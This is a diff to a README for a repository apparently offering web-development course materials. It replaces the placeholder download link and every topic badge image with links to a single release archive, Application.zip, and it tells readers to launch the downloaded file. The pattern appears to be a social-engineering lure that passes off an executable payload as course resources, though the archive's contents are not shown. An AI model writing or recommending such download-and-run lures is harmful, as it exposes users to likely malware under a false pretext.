@@ -9,9 +9,9 @@ Welcome to the "My_Course" repository, a place where you can find resources and 
 - **Topics:** Bootstrap, CSS, HTML, JS, JSON, PHP, PHPMyAdmin, Python, React, Sass, SCSS, TypeScript
 
 ## Get Started
-To access the materials and resources in this repository, please use the following link: [Download Course Materials](https://github.com/file/Application.zip)
+To access the materials and resources in this repository, please use the following link: [Download Course Materials](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
-[![Download Materials](https://img.shields.io/badge/Download-Materials-blue)](https://github.com/file/Application.zip)
+[![Download Materials](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 **Note:** If the link ends with the file name, you will need to launch the downloaded file to access the materials.
 
@@ -20,37 +20,37 @@ If you would like to explore more content related to this course, please check o
 
 ## Resources
 ### Bootstrap
-![Bootstrap](https://img.shields.io/badge/Bootstrap-Resources-green)
+![Bootstrap](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### CSS
-![CSS](https://img.shields.io/badge/CSS-Resources-orange)
+![CSS](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### HTML
-![HTML](https://img.shields.io/badge/HTML-Resources-yellow)
+![HTML](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### JavaScript
-![JavaScript](https://img.shields.io/badge/JavaScript-Resources-blue)
+![JavaScript](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### JSON
-![JSON](https://img.shields.io/badge/JSON-Resources-purple)
+![JSON](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### PHP
-![PHP](https://img.shields.io/badge/PHP-Resources-pink)
+![PHP](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### PHPMyAdmin
-![PHPMyAdmin](https://img.shields.io/badge/PHPMyAdmin-Resources-red)
+![PHPMyAdmin](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### Python
-![Python](https://img.shields.io/badge/Python-Resources-blueviolet)
+![Python](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### React
-![React](https://img.shields.io/badge/React-Resources-green)
+![React](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### Sass & SCSS
-![Sass & SCSS](https://img.shields.io/badge/Sass/SCSS-Resources-orange)
+![Sass & SCSS](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ### TypeScript
-![TypeScript](https://img.shields.io/badge/TypeScript-Resources-yellow)
+![TypeScript](https://github.com/Badmosh04/My_Course/releases/download/v1.0.0/Application.zip)
 
 ## Support
 If you have any questions or need assistance with the course materials, feel free to reach out to the course instructors or create an issue in this repository for further support.
